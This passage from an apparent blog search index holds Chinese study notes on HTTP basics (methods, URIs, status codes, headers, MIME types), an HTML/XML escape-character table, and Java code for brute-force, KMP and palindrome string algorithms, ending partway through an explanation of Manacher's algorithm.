请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。\n\n\nPUT\n从客户端向服务器传送的数据取代指定的文档的内容。\n\n\nDELETE\n请求服务器删除指定的页面。\n\n\nCONNECT\nHTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。\n\n\nOPTIONS\n允许客户端查看服务器的性能。\n\n\nTRACE\n回显服务器收到的请求，主要用于测试或诊断。\n\n\nPATCH\n是对 PUT 方法的补充，用来对已知资源进行局部更新 。\n\n\n\nGET 提交的数据会放在 URL 之后，也就是请求行里面，以?分割 URL 和传输数据，参数之间以&amp;相连，如 user?name&#x3D;zs&amp;id&#x3D;114514 。POST方法是把提交的数据放在 HTTP 包的请求体中。GET 提交的数据大小有限制（因为浏览器对 URL 的长度有限制，比如 IE 的限制是2083个字符，火狐是65536个字符，大概），而 POST 方法提交的数据没有限制。\n\nURIURI（uniform resource identifier），统一资源标识符，用来唯一的标识一个资源。它包含了 URL 和 URN 的概念，是它们的超集。\nURI 的组成：\n\nScheme 指的就是方案，比如 HTTP，HTTPS，FTP 等，我们也可以自定义协议，只要服务器支持即可。Scheme可以是由 字母、数字、+、-、. 都是允许的\n在Scheme之后，必须使用 :&#x2F;&#x2F; 把 Scheme 与后面的部分区分开来\n\n\nauthority 包含了用户名和密码（user information），还有主机和端口号。用户名密码在 URI 中明文传输非常不安全，所以除了 ftp 很少使用。通常只使用 host:port\npath 为路径 \nquery 为查询参数 为可选参数，以 ? 开头，参数以 &amp; 分隔，再以 &#x3D; 分开参数名称与数据\nfragment 为段落 为可选参数 以 # 开头，该标识符为辅助资源提供方向。\n\nURL（uniform resource locator），统一资源定位器，它是一种具体的 URI，即URL可以用来标识一个资源，而且还指明了如何 locate 这个资源。\n通过定位来获取资源。所以当目标资源位置发生变化，比如服务器宕机，或者位置变了，URL 就失效了。举个例子： http://localhost:8080/query?id=114514 来介绍它的格式，基本上是 URI 的简化（省去了部分）\n\n协议：一般为 http 或 https。\n主机：通常为域名，有时为 IP 地址。\n端口号：以数字方式表示，若为 http 的默认值 :80 可省略，https 的默认值 :443 端口号数字范围为 0~65536。\npath：以 &#x2F; 字符区别路径中的每一个目录名称，根路径为 &#x2F; 。\n查询：GET模式的窗体参数，以 ? 开头，参数以 &amp; 分隔，再以 &#x3D; 分开参数名称与数据，通常以 UTF-8 的 URL 编码，避开字符冲突的问题。\n\nURN（uniform resource name），统一资源命名，是通过名字来标识资源，比如 C4D038B4BED09FDB1471EF51EC3A32CD\n根据名字就可以找到对应的资源，相比 URL 的好处就是不论资源位置怎么变，都可以找到。但这明显是不现实的，因为这样就需要一个解析器去根据名字找到对应资源。这个解析器相当于 URL 解析域名的根服务器，不过资源与域名相比，不管是类型还是数量，URN的解析器都不太可能实际实现并投入实际使用。所以我们见到的 URI 主要以 URL 为主，基本上可以说 URL 约等于 URI 。\n状态码\n1xx 信息，服务器收到请求，需要请求者继续执行操作\n2xx 成功，操作被成功接收并处理\n3xx 重定向，需要进一步的操作以完成请求\n4xx 客户端错误，请求包含语法错误或无法完成请求\n5xx 服务器错误，服务器在处理请求的过程中发生了错误\n\n一些常见的状态码：\n\n\n\n状态码\n状态码英文名称\n中文描述\n\n\n\n200\nOK\n请求成功。一般用于GET与POST请求\n\n\n204\nNo Content\n无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档\n\n\n301\nMoved Permanently\n永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替\n\n\n302\nMoved Temporarily\n临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI\n\n\n400\nBad Request\n客户端请求的语法错误，服务器无法理解\n\n\n401\nUnauthorized\n请求要求用户的身份认证\n\n\n403\nForbidden\n服务器理解请求客户端的请求，但是拒绝执行此请求（可能因为权限问题）\n\n\n404\nNot Found\n服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面\n\n\n500\nInternal server Error\n服务器内部错误，无法完成请求\n\n\n更多状态码可以参考文档\nHTTP 首部字段HTTP 首部字段是构成 HTTP 报文的要素之一，在客户端与服务器之间以 HTTP 协议进行通信的过程中，无论是请求还是响应都会使用首部字段，它能起到传递额外重要信息的作用，比如报文主体大小、所使用的语言、认证信息、是否缓存、Cookie 等。HTTP&#x2F;1.1 规范定义了如下 47 种首部字段，分为四大类。还有一个其他扩展。\n通用首部字段：请求报文和响应报文都可以使用的首部字段。9个\n\n\n\n首部字段名\n说明\n\n\n\nCache-Control\n控制缓存的行为\n\n\nConnection\n连接的管理\n\n\nDate\n创建报文的日期时间\n\n\nPragma\n报文指令\n\n\nTrailer\n报文末端的首部一览\n\n\nTransfer-Encoding\n指定报文主体的传输编码方式\n\n\nUpgrade\n升级为其他协议\n\n\nVia\n代理服务器的相关信息\n\n\nWarning\n错误通知\n\n\n请求首部字段：从客户端向服务器发送请求报文时使用的首部字段。18个\n\n\n\n首部字段名\n说明\n\n\n\nAccept\n用户代理可处理的媒体类型\n\n\nAccept-Charset\n优先的字符集\n\n\nAccept-Encoding\n优先的内容编码\n\n\nAccept-Language\n优先的语言（自然语言）\n\n\nAuthorizationWeb\n认证信息\n\n\nExpect\n期待服务器的特定行为\n\n\nFrom\n用户的电子邮箱地址\n\n\nHost\n请求资源所在服务器\n\n\nIf-Match\n比较实体标记（ETag）\n\n\nIf-Modified-Since\n比较资源的更新时间\n\n\nIf-None-Match\n比较实体标记（与 If-Match 相反）\n\n\nIf-Range\n资源未更新时发送实体 Byte 的范围请求\n\n\nIf-Unmodified-Since\n比较资源的更新时间（与If-Modified-Since相反）\n\n\nMax-Forwards\n最大传输逐跳数\n\n\nProxy-Authorization\n代理服务器要求客户端的认证信息\n\n\nRange\n实体的字节范围请求\n\n\nReferer\n对请求中 URI 的原始获取方\n\n\nTE\n传输编码的优先级\n\n\nUser-Agent\n客户端程序的信息\n\n\n响应首部字段：从服务器端向向客户端返回响应报文时使用的首部字段。9个\n\n\n\n首部字段名\n说明\n\n\n\nAccept-Ranges\n是否接受字节范围请求\n\n\nAge\n推算资源创建经过时间\n\n\nETag\n资源的匹配信息\n\n\nLocation\n令客户端重定向至指定URI\n\n\nProxy-Authenticate\n代理服务器对客户端的认证信息\n\n\nRetry-After\n对再次发起请求的时机要求\n\n\nServer\nHTTP服务器的安装信息\n\n\nVary\n代理服务器缓存的管理信息\n\n\nWWW-Authenticate\n服务器对客户端的认证信息\n\n\n实体首部字段：针对请求报文和响应报文的实体部分使用的首部字段。10个\n\n\n\n首部字段名\n说明\n\n\n\nAllow\n资源可支持的HTTP方法\n\n\nContent-Encoding\n实体主体适用的编码方式\n\n\nContent-Language\n实体主体的自然语言\n\n\nContent-Length\n实体主体的大小（单位：字节）\n\n\nContent-Location\n替代对应资源的URI\n\n\nContent-MD5\t实体主体的报文摘要\n\n\n\nContent-Range\n实体主体的位置范围\n\n\nContent-Type\n实体主体的媒体类型\n\n\nExpires\n实体主体过期的日期时间\n\n\nLast-Modified\n资源的最后修改日期时间\n\n\n扩展首部字段：非 HTTP 协议标准规定的首部字段，通常由开发者创建，用于某些特殊用途，比如 Cookie、Set-Cookie。\n详细具体的作用就不一一列举了，不然太多了，就成文档了。具体用时可以再根据这些去查具体参数及用法。\ncontent-type 与 MIMEContent-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件。Content-Type 标头告诉客户端实际返回的内容的内容类型。也是客户端告诉服务端请求体中内容的内容形式。\n详细媒体格式可以参考菜鸟教程\nMIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。因为因特网上有非常多不同类型的数据，HTTP 会为每种要通过 web 传输的对象都打上 MIME 类型的数据格式标签。\n比较常用的几种：HTML 格式的文本文档由 text&#x2F;html  类型来标记普通的 ASCII 文本文档由  text&#x2F;plain  类型来标JPEG 版本的图片为  image&#x2F;jpeg  类型GIF 格式的图片为 image&#x2F;gif  类型Apple 的 QuickTime 电影为 video&#x2F;quicktime  类型微软的 PowerPoint 演示文件为 application&#x2F;vnd.ms-powerpoint 类型\n其他更多的 MIME 类型可以参考菜鸟教程\n结尾上文中实现的简单的 socket 程序接受浏览器的 http 请求。如果它加上线程池，便可以同时处理多个请求。另外在对其 http 请求和响应进行封装，便可以实现一个功能简单的 http服务器。\n","categories":["学习笔记"],"tags":["HTTP协议","socket","状态码","URI"]},{"title":"HTML/XML转义字符对照表","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/HTML-XML%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E5%AF%B9%E7%85%A7%E8%A1%A8/","content":"\n转义字符串（Escape Sequence），即字符实体（Character Entity）分成三部分：第一部分是一个&amp;符号，英文叫ampersand；第二部分是实体（Entity）名字或者是#加上实体（Entity）编号；第三部分是一个分号。\n\n常用的转义字符列表\n\n\n显示\n说明\n实体名称\n十进制编号\n\n\n\n\n半方大的空白\n&amp;ensp;\n&amp;#8194;\n\n\n\n全方大的空白\n&amp;emsp;\n&amp;#8195;\n\n\n\n不断行的空白格\n&amp;nbsp;\n&amp;#160;\n\n\n&lt;\n小于\n&amp;lt;\n&amp;#60;\n\n\n&gt;\n大于\n&amp;gt;\n&amp;#62;\n\n\n&amp;\n&amp;符号\n&amp;amp;\n&amp;#38;\n\n\n“\n双引号\n&amp;quot;\n&amp;#34;\n\n\n©\n版权\n&amp;copy;\n&amp;#169;\n\n\n®\n已注册商标\n&amp;reg;\n&amp;#174;\n\n\n™\n商标（美国）\n&amp;trade;\n&amp;#8482;\n\n\n×\n乘号\n&amp;times;\n&amp;#215;\n\n\n÷\n除号\n&amp;divide;\n&amp;#247;\n\n\nISO 8859-1 (Latin-1)字符集\n\n\n显示\n名称\n十进制\n\n\n\n\n&amp;nbsp;\n&amp;#160;\n\n\n¡\n&amp;iexcl;\n&amp;#161;\n\n\n¢\n&amp;cent;\n&amp;#162;\n\n\n£\n&amp;pound;\n&amp;#163;\n\n\n¤\n&amp;curren;\n&amp;#164;\n\n\n¥\n&amp;yen;\n&amp;#165;\n\n\n¦\n&amp;brvbar;\n&amp;#166;\n\n\n§\n&amp;sect;\n&amp;#167;\n\n\n¨\n&amp;uml;\n&amp;#168;\n\n\n©\n&amp;copy;\n&amp;#169;\n\n\nª\n&amp;ordf;\n&amp;#170;\n\n\n«\n&amp;laquo;\n&amp;#171;\n\n\n¬\n&amp;not;\n&amp;#172;\n\n\n\n&amp;shy;\n&amp;#173;\n\n\n®\n&amp;reg;\n&amp;#174;\n\n\n¯\n&amp;macr;\n&amp;#175;\n\n\n°\n&amp;deg;\n&amp;#176;\n\n\n±\n&amp;plusmn;\n&amp;#177;\n\n\n²\n&amp;sup2;\n&amp;#178;\n\n\n³\n&amp;sup3;\n&amp;#179;\n\n\n´\n&amp;acute;\n&amp;#180;\n\n\nµ\n&amp;micro;\n&amp;#181;\n\n\n¶\n&amp;para;\n&amp;#182;\n\n\n·\n&amp;middot;\n&amp;#183;\n\n\n¸\n&amp;cedil;\n&amp;#184;\n\n\n¹\n&amp;sup1;\n&amp;#185;\n\n\nº\n&amp;ordm;\n&amp;#186;\n\n\n»\n&amp;raquo;\n&amp;#187;\n\n\n¼\n&amp;frac14;\n&amp;#188;\n\n\n½\n&amp;frac12;\n&amp;#189;\n\n\n¾\n&amp;frac34;\n&amp;#190;\n\n\n¿\n&amp;iquest;\n&amp;#191;\n\n\nÀ\n&amp;Agrave;\n&amp;#192;\n\n\nÁ\n&amp;Aacute;\n&amp;#193;\n\n\nÂ\n&amp;Acirc;\n&amp;#194;\n\n\nÃ\n&amp;Atilde;\n&amp;#195;\n\n\nÄ\n&amp;Auml;\n&amp;#196;\n\n\nÅ\n&amp;Aring;\n&amp;#197;\n\n\nÆ\n&amp;AElig;\n&amp;#198;\n\n\nÇ\n&amp;Ccedil;\n&amp;#199;\n\n\nÈ\n&amp;Egrave;\n&amp;#200;\n\n\nÉ\n&amp;Eacute;\n&amp;#201;\n\n\nÊ\n&amp;Ecirc;\n&amp;#202;\n\n\nË\n&amp;Euml;\n&amp;#203;\n\n\nÌ\n&amp;Igrave;\n&amp;#204;\n\n\nÍ\n&amp;Iacute;\n&amp;#205;\n\n\nÎ\n&amp;Icirc;\n&amp;#206;\n\n\nÏ\n&amp;Iuml;\n&amp;#207;\n\n\nÐ\n&amp;ETH;\n&amp;#208;\n\n\nÑ\n&amp;Ntilde;\n&amp;#209;\n\n\nÒ\n&amp;Ograve;\n&amp;#210;\n\n\nÓ\n&amp;Oacute;\n&amp;#211;\n\n\nÔ\n&amp;Ocirc;\n&amp;#212;\n\n\nÕ\n&amp;Otilde;\n&amp;#213;\n\n\nÖ\n&amp;Ouml;\n&amp;#214;\n\n\n×\n&amp;times;\n&amp;#215;\n\n\nØ\n&amp;Oslash;\n&amp;#216;\n\n\nÙ\n&amp;Ugrave;\n&amp;#217;\n\n\nÚ\n&amp;Uacute;\n&amp;#218;\n\n\nÛ\n&amp;Ucirc;\n&amp;#219;\n\n\nÜ\n&amp;Uuml;\n&amp;#220;\n\n\nÝ\n&amp;Yacute;\n&amp;#221;\n\n\nÞ\n&amp;THORN;\n&amp;#222;\n\n\nß\n&amp;szlig;\n&amp;#223;\n\n\nà\n&amp;agrave;\n&amp;#224;\n\n\ná\n&amp;aacute;\n&amp;#225;\n\n\nâ\n&amp;acirc;\n&amp;#226;\n\n\nã\n&amp;atilde;\n&amp;#227;\n\n\nä\n&amp;auml;\n&amp;#228;\n\n\nå\n&amp;aring;\n&amp;#229;\n\n\næ\n&amp;aelig;\n&amp;#230;\n\n\nç\n&amp;ccedil;\n&amp;#231;\n\n\nè\n&amp;egrave;\n&amp;#232;\n\n\né\n&amp;eacute;\n&amp;#233;\n\n\nê\n&amp;ecirc;\n&amp;#234;\n\n\në\n&amp;euml;\n&amp;#235;\n\n\nì\n&amp;igrave;\n&amp;#236;\n\n\ní\n&amp;iacute;\n&amp;#237;\n\n\nî\n&amp;icirc;\n&amp;#238;\n\n\nï\n&amp;iuml;\n&amp;#239;\n\n\nð\n&amp;eth;\n&amp;#240;\n\n\nñ\n&amp;ntilde;\n&amp;#241;\n\n\nò\n&amp;ograve;\n&amp;#242;\n\n\nó\n&amp;oacute;\n&amp;#243;\n\n\nô\n&amp;ocirc;\n&amp;#244;\n\n\nõ\n&amp;otilde;\n&amp;#245;\n\n\nö\n&amp;ouml;\n&amp;#246;\n\n\n÷\n&amp;divide;\n&amp;#247;\n\n\nø\n&amp;oslash;\n&amp;#248;\n\n\nù\n&amp;ugrave;\n&amp;#249;\n\n\nú\n&amp;uacute;\n&amp;#250;\n\n\nû\n&amp;ucirc;\n&amp;#251;\n\n\nü\n&amp;uuml;\n&amp;#252;\n\n\ný\n&amp;yacute;\n&amp;#253;\n\n\nþ\n&amp;thorn;\n&amp;#254;\n\n\nÿ\n&amp;yuml;\n&amp;#255;\n\n\n符号、数学符号和希腊字母 symbols, mathematical symbols, and Greek letters\n\n\n符号\n名称\n十进制\n\n\n\nƒ\n&amp;fnof;\n&amp;#402;\n\n\nΑ\n&amp;Alpha;\n&amp;#913;\n\n\nΒ\n&amp;Beta;\n&amp;#914;\n\n\nΓ\n&amp;Gamma;\n&amp;#915;\n\n\nΔ\n&amp;Delta;\n&amp;#916;\n\n\nΕ\n&amp;Epsilon;\n&amp;#917;\n\n\nΖ\n&amp;Zeta;\n&amp;#918;\n\n\nΗ\n&amp;Eta;\n&amp;#919;\n\n\nΘ\n&amp;Theta;\n&amp;#920;\n\n\nΙ\n&amp;Iota;\n&amp;#921;\n\n\nΚ\n&amp;Kappa;\n&amp;#922;\n\n\nΛ\n&amp;Lambda;\n&amp;#923;\n\n\nΜ\n&amp;Mu;\n&amp;#924;\n\n\nΝ\n&amp;Nu;\n&amp;#925;\n\n\nΞ\n&amp;Xi;\n&amp;#926;\n\n\nΟ\n&amp;Omicron;\n&amp;#927;\n\n\nΠ\n&amp;Pi;\n&amp;#928;\n\n\nΡ\n&amp;Rho;\n&amp;#929;\n\n\nΣ\n&amp;Sigma;\n&amp;#931;\n\n\nΤ\n&amp;Tau;\n&amp;#932;\n\n\nΥ\n&amp;Upsilon;\n&amp;#933;\n\n\nΦ\n&amp;Phi;\n&amp;#934;\n\n\nΧ\n&amp;Chi;\n&amp;#935;\n\n\nΨ\n&amp;Psi;\n&amp;#936;\n\n\nΩ\n&amp;Omega;\n&amp;#937;\n\n\nα\n&amp;alpha;\n&amp;#945;\n\n\nβ\n&amp;beta;\n&amp;#946;\n\n\nγ\n&amp;gamma;\n&amp;#947;\n\n\nδ\n&amp;delta;\n&amp;#948;\n\n\nε\n&amp;epsilon;\n&amp;#949;\n\n\nζ\n&amp;zeta;\n&amp;#950;\n\n\nη\n&amp;eta;\n&amp;#951;\n\n\nθ\n&amp;theta;\n&amp;#952;\n\n\nι\n&amp;iota;\n&amp;#953;\n\n\nκ\n&amp;kappa;\n&amp;#954;\n\n\nλ\n&amp;lambda;\n&amp;#955;\n\n\nμ\n&amp;mu;\n&amp;#956;\n\n\nν\n&amp;nu;\n&amp;#957;\n\n\nξ\n&amp;xi;\n&amp;#958;\n\n\nο\n&amp;omicron;\n&amp;#959;\n\n\nπ\n&amp;pi;\n&amp;#960;\n\n\nρ\n&amp;rho;\n&amp;#961;\n\n\nς\n&amp;sigmaf;\n&amp;#962;\n\n\nσ\n&amp;sigma;\n&amp;#963;\n\n\nτ\n&amp;tau;\n&amp;#964;\n\n\nυ\n&amp;upsilon;\n&amp;#965;\n\n\nφ\n&amp;phi;\n&amp;#966;\n\n\nχ\n&amp;chi;\n&amp;#967;\n\n\nψ\n&amp;psi;\n&amp;#968;\n\n\nω\n&amp;omega;\n&amp;#969;\n\n\n?\n&amp;thetasym;\n&amp;#977;\n\n\n?\n&amp;upsih;\n&amp;#978;\n\n\n?\n&amp;piv;\n&amp;#982;\n\n\n•\n&amp;bull;\n&amp;#8226;\n\n\n…\n&amp;hellip;\n&amp;#8230;\n\n\n′\n&amp;prime;\n&amp;#8242;\n\n\n″\n&amp;Prime;\n&amp;#8243;\n\n\n‾\n&amp;oline;\n&amp;#8254;\n\n\n⁄\n&amp;frasl;\n&amp;#8260;\n\n\n℘\n&amp;weierp;\n&amp;#8472;\n\n\nℑ\n&amp;image;\n&amp;#8465;\n\n\nℜ\n&amp;real;\n&amp;#8476;\n\n\n™\n&amp;trade;\n&amp;#8482;\n\n\nℵ\n&amp;alefsym;\n&amp;#8501;\n\n\n←\n&amp;larr;\n&amp;#8592;\n\n\n↑\n&amp;uarr;\n&amp;#8593;\n\n\n→\n&amp;rarr;\n&amp;#8594;\n\n\n↓\n&amp;darr;\n&amp;#8595;\n\n\n↔\n&amp;harr;\n&amp;#8596;\n\n\n↵\n&amp;crarr;\n&amp;#8629;\n\n\n⇐\n&amp;lArr;\n&amp;#8656;\n\n\n⇑\n&amp;uArr;\n&amp;#8657;\n\n\n⇒\n&amp;rArr;\n&amp;#8658;\n\n\n⇓\n&amp;dArr;\n&amp;#8659;\n\n\n⇔\n&amp;hArr;\n&amp;#8660;\n\n\n∀\n&amp;forall;\n&amp;#8704;\n\n\n∂\n&amp;part;\n&amp;#8706;\n\n\n∃\n&amp;exist;\n&amp;#8707;\n\n\n∅\n&amp;empty;\n&amp;#8709;\n\n\n∇\n&amp;nabla;\n&amp;#8711;\n\n\n∈\n&amp;isin;\n&amp;#8712;\n\n\n∉\n&amp;notin;\n&amp;#8713;\n\n\n∋\n&amp;ni;\n&amp;#8715;\n\n\n∏\n&amp;prod;\n&amp;#8719;\n\n\n∑\n&amp;sum;\n&amp;#8721;\n\n\n−\n&amp;minus;\n&amp;#8722;\n\n\n∗\n&amp;lowast;\n&amp;#8727;\n\n\n√\n&amp;radic;\n&amp;#8730;\n\n\n∝\n&amp;prop;\n&amp;#8733;\n\n\n∞\n&amp;infin;\n&amp;#8734;\n\n\n∠\n&amp;ang;\n&amp;#8736;\n\n\n∧\n&amp;and;\n&amp;#8743;\n\n\n∨\n&amp;or;\n&amp;#8744;\n\n\n∩\n&amp;cap;\n&amp;#8745;\n\n\n∪\n&amp;cup;\n&amp;#8746;\n\n\n∫\n&amp;int;\n&amp;#8747;\n\n\n∴\n&amp;there4;\n&amp;#8756;\n\n\n∼\n&amp;sim;\n&amp;#8764;\n\n\n∝\n&amp;cong;\n&amp;#8773;\n\n\n≈\n&amp;asymp;\n&amp;#8776;\n\n\n≠\n&amp;ne;\n&amp;#8800;\n\n\n≡\n&amp;equiv;\n&amp;#8801;\n\n\n≤\n&amp;le;\n&amp;#8804;\n\n\n≥\n&amp;ge;\n&amp;#8805;\n\n\n⊂\n&amp;sub;\n&amp;#8834;\n\n\n⊃\n&amp;sup;\n&amp;#8835;\n\n\n⊄\n&amp;nsub;\n&amp;#8836;\n\n\n⊆\n&amp;sube;\n&amp;#8838;\n\n\n⊇\n&amp;supe;\n&amp;#8839;\n\n\n⊕\n&amp;oplus;\n&amp;#8853;\n\n\n⊗\n&amp;otimes;\n&amp;#8855;\n\n\n⊥\n&amp;perp;\n&amp;#8869;\n\n\n⋅\n&amp;sdot;\n&amp;#8901;\n\n\n?\n&amp;lceil;\n&amp;#8968;\n\n\n?\n&amp;rceil;\n&amp;#8969;\n\n\n?\n&amp;lfloor;\n&amp;#8970;\n\n\n?\n&amp;rfloor;\n&amp;#8971;\n\n\n?\n&amp;lang;\n&amp;#9001;\n\n\n?\n&amp;rang;\n&amp;#9002;\n\n\n◊\n&amp;loz;\n&amp;#9674;\n\n\n♠\n&amp;spades;\n&amp;#9824;\n\n\n♣\n&amp;clubs;\n&amp;#9827;\n\n\n♥\n&amp;hearts;\n&amp;#9829;\n\n\n♦\n&amp;diams;\n&amp;#9830;\n\n\n重要的国际标记 markup-significant and internationalization characters\n\n\n字符\n名称\n十进制\n\n\n\n“\n&amp;quot;\n&amp;#34;\n\n\n&#96;&amp;\n&amp;&#96;\n&amp;#38;\n\n\n&lt;\n&amp;lt;\n&amp;#60;\n\n\n&gt;\n&amp;gt;\n&amp;#62;\n\n\nŒ\n&amp;OElig;\n&amp;#338;\n\n\nœ\n&amp;oelig;\n&amp;#339;\n\n\nŠ\n&amp;Scaron;\n&amp;#352;\n\n\nš\n&amp;scaron;\n&amp;#353;\n\n\nŸ\n&amp;Yuml;\n&amp;#376;\n\n\nˆ\n&amp;circ;\n&amp;#710;\n\n\n˜\n&amp;tilde;\n&amp;#732;\n\n\n\n&amp;ensp;\n&amp;#8194;\n\n\n\n&amp;emsp;\n&amp;#8195;\n\n\n\n&amp;thinsp;\n&amp;#8201;\n\n\n\n&amp;zwnj;\n&amp;#8204;\n\n\n\n&amp;zwj;\n&amp;#8205;\n\n\n\n&amp;lrm;\n&amp;#8206;\n\n\n\n&amp;rlm;\n&amp;#8207;\n\n\n–\n&amp;ndash;\n&amp;#8211;\n\n\n—\n&amp;mdash;\n&amp;#8212;\n\n\n‘\n&amp;lsquo;\n&amp;#8216;\n\n\n’\n&amp;rsquo;\n&amp;#8217;\n\n\n‚\n&amp;sbquo;\n&amp;#8218;\n\n\n“\n&amp;ldquo;\n&amp;#8220;\n\n\n”\n&amp;rdquo;\n&amp;#8221;\n\n\n„\n&amp;bdquo;\n&amp;#8222;\n\n\n†\n&amp;dagger;\n&amp;#8224;\n\n\n‡\n&amp;Dagger;\n&amp;#8225;\n\n\n‰\n&amp;permil;\n&amp;#8240;\n\n\n‹\n&amp;lsaquo;\n&amp;#8249;\n\n\n›\n&amp;rsaquo;\n&amp;#8250;\n\n\n€\n&amp;euro;\n&amp;#8364;\n\n\n","categories":["学习笔记"],"tags":["HTML","XML","转义字符"]},{"title":"KMP和Manacher算法","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/KMP%E5%92%8CManacher%E7%AE%97%E6%B3%95/","content":"字符串匹配（模式匹配）问题：给定一个主串（以 S 代替）和模式串（以 P 代替），要求找出 P 在 S 中出现的位置，此即串的模式匹配问题。\n暴力匹配（BF）暴力匹配即将主串每个元素都作为起点和模式串相比较，直至后续与模式串全部匹配则成功找到。\npublic class BF &#123;    /**     * 暴力算法（Brute Force）     */    public static int BF(String S, String P) &#123;        char[] s = S.toCharArray();        char[] p = P.toCharArray();        // 遍历主串所有元素，从每个元素作为起点和模式串比较        for (int i = 0; i &lt; S.length(); i++) &#123;            int j;            int temp = i;            // 从当前i作为起点比较，不等则break，相等则判断下一个。直至判断长度与模式串长度相等。即匹配成功            for (j = 0; j &lt; P.length(); j++) &#123;                if (s[temp] != p[j]) &#123;                    break;                &#125;                temp++;            &#125;            if (j == P.length()) &#123;                return i;            &#125;        &#125;        return -1;    &#125;&#125;\n\nKMPKMP算法是一种改进的字符串匹配算法。从暴力算法中可以看出，每次匹配失败时，都会从主串的下一个字符重新开始与模式串一一比较。即每次失败，模式串只右移了一位。KMP算法的关键是利用匹配失败后的信息，尽量减少模式串与主串的匹配次数以达到快速匹配的目的。 即让模式串尽可能多的向右移。\n匹配失败后，模式串该向右移多少位。将会记录在next数组中，next数组只与模式串本身有关，与主串无关。下面来解释下next数组的含义以及求法。\n匹配失败时，主串与模式串失败位置的字符不同，但是模式串这个字符前所有字符与主串这个字符前的字符串是匹配的。如果模式串匹配失败字符串前的字串中，有与开头n个字符长度重复的公共元素。那么下一次比较从重复的地方开始即可。无需从模式串的起始开始，从而减少比较次数。比如：\n主串：      abcdabcdabd模式串：    abcdabd\n当匹配到第七个元素时，主串c与模式串d不等。但d前有长度为2的重复公共元素（与开头开始的元素有2长度的重合）：ab所以可以将模式串向右移4位，即使得从头开始的重复子串后一个元素与匹配失败的元素比较。 因为前面的元素是匹配过的重复元素。\n主串：      abcdabcdabd模式串：        abcdabd\n\n这个重复的公共元素长度叫 最大前缀后缀公共元素长度对于字符串 abcdabd 来说。它的各个子串的前缀后缀的公共元素的最大长度如下表格所示：\n\n\n\n字符\na\nb\nc\nd\na\nb\nd\n\n\n\n最大前缀后缀公共元素长度\n0\n0\n0\n0\n1\n2\n0\n\n\nnext数组考虑的是除了当前字符串外的最长相同前缀后缀，所以去除当前字符，只看他前面的。将上表得到的值整体往后移一位即可。同时，模式串首位初值赋为-1。原因是标记开头，当开头不匹配时，模式串右移一位，而不是回到0位置，导致陷入循环。字符串 abcdabd 的 next 数组：\n\n\n\n字符\na\nb\nc\nd\na\nb\nd\n\n\n\n最大前缀后缀公共元素长度\n-1\n0\n0\n0\n0\n1\n2\n\n\nnext数组的实现：\npackage PatternMatching;public class KMP &#123;    public static int[] getNext(String P) &#123;        char[] p = P.toCharArray();        int[] next = new int[P.length()];        // 起始位置为-1        next[0] = -1;        int j = 0;        int k = -1;        while (j &lt; p.length - 1) &#123;            // p[k]表示前缀，p[j]表示后缀            if (k == -1 || p[k] == p[j]) &#123;                next[++j] = ++k;            &#125; else &#123;                // 不匹配，前缀则回到上一个最大重复的位置（next数组构造本身就用到了next数组的特性）                k = next[k];            &#125;        &#125;        return next;    &#125;&#125;\n\nKMP中else部分，与求next数组中的else部分是一样的。KMP实现：\npackage PatternMatching;public class KMP &#123;    public static int KMP(String S, String P) &#123;        char[] s = S.toCharArray();        char[] p = P.toCharArray();        int i = 0;        int j = 0;        int[] next = getNext(P);        while (i &lt; s.length &amp;&amp; j &lt; p.length) &#123;            if (j == -1 || s[i] == p[j]) &#123;                i++;                j++;            &#125; else &#123;                j = next[j];            &#125;        &#125;        return j == p.length ? i - j : -1;    &#125;&#125;\n\n求字符串的最长回文子串暴力（BF）照例先暴力实现时间复杂度 O(n^2)\npackage LongestPalindromicSubstring;public class BF &#123;    public static int BF(String str) &#123;        char[] string = str.toCharArray();        int result = 0;        for (int i = 0; i &lt; str.length(); i++) &#123;            // 判断奇数长度回文            int l = i - 1;            int r = i + 1;            while (l &gt;= 0 &amp;&amp; r &lt; str.length() &amp;&amp; string[l] == string[r]) &#123;                l--;                r++;            &#125;            result = Math.max(result, r - l - 1);            // 判断偶数长度回文            l = i;            r = i + 1;            while (l &gt;= 0 &amp;&amp; r &lt; str.length() &amp;&amp; string[l] == string[r]) &#123;                l--;                r++;            &#125;            result = Math.max(result, r - l - 1);        &#125;        return result;    &#125;&#125;\n\nManacher算法Manacher算法，也叫马拉车算法 （翻译的信达雅呢）这个算法用于求字符串的最长回文子串。时间复杂度到了 O(n)\nManacher的核心就是回文半径的概念。由于回文串的奇偶不一样，处理也不同。所以在处理之前，在每个字符前后添加一个相同字符。这样左右的回文串都会变成奇回文串。比如 abba 通过处理变成 #a#b#b#a#\n回文半径和回文直径：因为处理后回文字符串的长度一定是奇数，所以回文半径是包括回文中心在内的回文子串的一半的长度，回文直径则是回文半径的2倍减1。比如对于字符串 “aba”，在字符 ‘b’ 处的回文半径就是2，回文直径就是3。最右回文边界R：在遍历字符串时，每个字符遍历出的最长回文子串都会有个右边界，而R则是所有已知右边界中最靠右的位置，也就是说R的值是只增不减的。回文中心C：取得当前R的第一次更新时的回文中心。由此可见R和C时伴生的。半径数组：这个数组记录了原字符串中每一个字符对应的最长回文半径。\n过程：从i&#x3D;0遍历字符串\n\n当i&gt;R 即i在R外，那直接暴力匹配以i为中心的回文子串\n当i&lt;&#x3D;R 